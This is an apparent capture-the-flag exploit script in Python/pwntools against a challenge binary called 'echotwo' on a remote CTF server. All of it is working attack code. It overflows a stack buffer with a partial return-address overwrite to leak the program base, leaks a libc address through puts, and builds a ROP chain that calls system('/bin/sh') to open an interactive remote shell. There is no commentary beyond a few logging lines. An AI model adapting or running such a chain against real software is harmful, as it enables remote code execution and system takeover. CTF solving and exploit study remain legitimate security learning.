from pwn import *

exe = ELF("./challenge")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

#p = process("./challenge")
#gdb.attach(p)
p = remote("echotwo.wolvctf-2023.kctf.cloud", 1337)

offset = 279
sending = offset + 1

payload = b"A"*offset
payload += b"\x4c" # start of main func (after push rbp)

p.recvline()
p.sendline(str(sending + 1).encode())
p.sendline(payload)

p.recvuntil(b"A"*offset)
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")

exe_base = leak - (exe.sym["main"] + 5)
puts_plt = exe_base + exe.plt["puts"]

main = exe_base + 0x1247
ret = exe_base + 0x101a

log.success(f"{hex(exe_base)=}")
log.info(f"{hex(puts_plt)=}")

print("===========================")

second_payload = b"B"*offset
second_payload += p64(ret)
second_payload += p64(puts_plt)
second_payload += p64(ret)
second_payload += p64(main)

p.recvuntil(b"Echo2")
p.sendline(str(sending + 8*4).encode())
p.sendline(second_payload)

p.recvuntil(b"B"*offset)
p.recvline()
libc_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(libc_leak)=}")

libc.address = libc_leak - 0x620d0
log.success(f"{hex(libc.address)=}")

print("===========================")

libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]
pop_rdi = libc.address + 0x2a3e5

log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))
log.info("pop_rdi: "+ str(hex(pop_rdi)))

third_payload = b"B"*offset
third_payload += p64(pop_rdi)
third_payload += p64(binsh)
third_payload += p64(ret)
third_payload += p64(libc_system)
third_payload += p64(libc_exit)

p.recvuntil(b"Echo2")
p.sendline(str(sending + 8*5).encode())
p.sendline(third_payload)

p.interactive()

